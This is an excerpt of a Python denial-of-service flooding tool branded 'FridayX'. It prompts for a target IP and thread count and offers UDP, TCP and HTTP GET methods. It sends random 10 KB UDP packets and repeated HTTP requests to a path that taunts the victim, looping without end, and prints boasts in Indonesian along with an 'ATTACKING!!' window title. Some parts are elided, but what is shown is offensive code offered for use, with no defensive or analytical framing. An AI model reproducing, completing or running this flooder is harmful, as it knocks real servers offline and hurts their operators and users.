...
referers = [
     'Your_Server_Bypassed_By_FridayX',
     'Your_Server_Bypassed_By_FridayX',
     'Your_Server_Bypassed_By_FridayX',
     'Your_Server_Bypassed_By_FridayX',
     'Your_Server_Bypassed_By_FridayX',
...
|             METHOD LIST                |
|  |UDPGET| |TCPGET| |GET| |UDP| |TCP|   |
__________________________________________
""")
print("@FridaX")
ip = str(input(" \033[94mIp target \033[1;31;40m  ====> : "))
...
threads = int(input(" \033[94mThreads \033[1;31;40m    ====> : "))
  ...
  while True:
    try:
      ...
      for x in range(times):
        s.sendto(data,addr)
        print(+"\033[0;37;40m FRIDAX MENYENGGOL IP %s \033[33mPORT %s"%(ip,port))
    except:
      print("\033[0;37;40m FRIDAYX MENYENGGOL IP %s PORT %s"%(ip,port))
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Bypassed_By_FridayX HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['D'])+ " & cls & title FridayX [ ATTACKING!!]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(10240)
    if choice == "1":
        get_host = "GET /Your_Server_Bypassed_By_FridayX HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Bypassed_By_FridayX HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("\033[1;36;40m FRIDAX MENYENGGOL IP %s PORT %s"%(ip,port))
        except socket.error:
            s.close()
            print("\033[1;36;40m FRIDAYX MENYENGGOL IP %s PORT %s"%(ip,port))
